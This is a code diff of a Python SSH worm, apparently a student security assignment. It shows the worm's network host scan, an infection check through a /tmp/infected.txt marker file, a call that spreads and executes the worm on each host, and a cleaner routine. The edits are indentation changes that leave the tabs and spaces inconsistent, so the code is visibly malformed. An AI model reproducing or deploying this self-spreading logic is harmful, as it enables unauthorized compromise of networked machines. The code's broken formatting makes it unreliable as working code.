@@ -164,10 +164,8 @@ def cleaner(sshClient):
 	# TODO:
 	# remove the infection (i.e. marker file) from the host
 	# remove the worm program from the host
-    sshClient.open_sftp()
-
+	sshClient.open_sftp()
 	sshClient.exec_command("rm /tmp/worm.py /tmp/infected.txt")
-
 	sshClient.close()
 
 # If we are being run without a command line parameters,
@@ -207,8 +205,8 @@ elif (len(sys.argv) == 2):
 
             if sshInfo:
                 print("Cleaning worm-infested host:")
-				print(sshInfo)
-				cleaner(sshInfo)
+		print(sshInfo)
+		cleaner(sshInfo)
 
     elif(sys.argv[1] == '-e'):
 
@@ -220,11 +218,11 @@ elif (len(sys.argv) == 2):
 
         print("...Looking for hosts on the same network...")
 
-		networkHosts = getHostsOnTheSameNetwork()
+	networkHosts = getHostsOnTheSameNetwork()
 
-		networkHosts.remove(myIP)
+	networkHosts.remove(myIP)
 
-		print "Hosts Found: ", networkHosts
+	print "Hosts Found: ", networkHosts
 
         for host in networkHosts:
 
@@ -236,17 +234,17 @@ elif (len(sys.argv) == 2):
                 print "***** Spreading ******"
 
                 try:
-                    sftp = sshInfo.open_sftp()
-                        remotepath='/tmp/infected.txt'
+			sftp = sshInfo.open_sftp()
+			remotepath='/tmp/infected.txt'
                         localpath='/home/cpsc/infected.txt'
-                    sftp.get(remotepath,localpath)
-                    print ("System is already infected!")
+			sftp.get(remotepath,localpath)
+			print ("System is already infected!")
                 except IOError:
                         print "System is infected"
                 spreadAndExecute(sshInfo)
                 print "Spreading complete"
     else:
         print "Invalid command. Usage: worm.py -e || -c"
-		sys.exit()
+	sys.exit()
 elif (len(sys.argv) > 2):
 	print("Invalid command")
